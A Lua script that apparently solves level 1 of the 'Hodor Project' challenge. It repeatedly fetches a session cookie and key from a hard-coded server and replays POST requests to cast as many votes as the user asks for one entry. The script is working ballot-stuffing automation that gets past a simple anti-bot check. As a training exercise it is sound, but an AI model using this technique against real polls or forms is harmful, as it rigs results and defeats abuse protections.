#!/usr/bin/env lua
--[[
 ===-----------------------------------------------------------------------===
      Hodor Project level 1, by Julien Barbier
      Using Lua programming language.

      By Alexandro de Oliveira.
 ===-----------------------------------------------------------------------===
 ]]

--  To install the http package do: $ luarocks install luasocket
local http = require "socket.http"
local ltn12 = require "ltn12"
local utils = require "utils"

local url = "http://173.246.108.142/level1.php"
local count = 0
io.write("How many votes? => ") -- Prints the message requesting total votes.
local total = io.read("*n")     -- Reading a number from user.
while count < total do
    -- HEAD request to get a cookie and use it in the POST request.
    local _, _, header = http.request {
        method = "HEAD",
        url = url,
        headers =
                {
                        ['User-Agent'] = "Havk64 Lua Requests"
                }
    }
    local hc = header['set-cookie']
    local tcookie = utils.parse(hc)
    local cookie = tcookie['cookie']
    local value = tcookie['value']
    -- Print the Header of HEAD request:
    -- print (p(headers))

    -- Preparing the POST request:
    local reqbody = "id=23&holdthedoor=submit&key=" .. value
    local respbody = {}
    local _, _, headers = http.request {
        method = "POST",
        url = url,
        source = ltn12.source.string(reqbody),
        headers =
                {
                        ["Accept"] = "*/*",
                        ["Accept-Encoding"] = "gzip, deflate",
                        ["Accept-Language"] = "en-us",
                        ['User-Agent'] = "Havk64 Lua Script Requests",
                        --['Connection'] = "keep-alive",
                        ["Cookie"] = cookie,
                        ["Content-Type"] = "application/x-www-form-urlencoded",
                        ["content-length"] = string.len(reqbody)
                    },

                    sink = ltn12.sink.table(respbody)

        }
        -- Checking the response header:
        -- print (p(headers))
        local test = headers['set-cookie']
        if test ~= nil then
            print("Vote number: " .. (count + 1))
            count = count + 1
        else
            print("Failed")
        end
end
